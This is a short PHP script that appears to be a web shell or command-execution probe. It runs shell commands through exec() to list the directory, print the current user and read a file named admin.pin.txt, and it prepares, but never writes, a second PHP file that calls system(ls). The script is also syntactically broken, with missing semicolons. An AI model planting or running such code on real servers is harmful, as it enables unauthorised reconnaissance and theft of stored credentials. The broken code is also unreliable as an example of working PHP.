<?php 
$pagename = 'my_page1';

$newFileName = './'.$pagename.".php";
$newFileContent = '<?php echo "here we are"; echo system(ls);?>';
echo exec('ls');
echo "space  \n"
echo exec('whoami');
echo "space  \n"
echo exec('cat admin.pin.txt');
?>

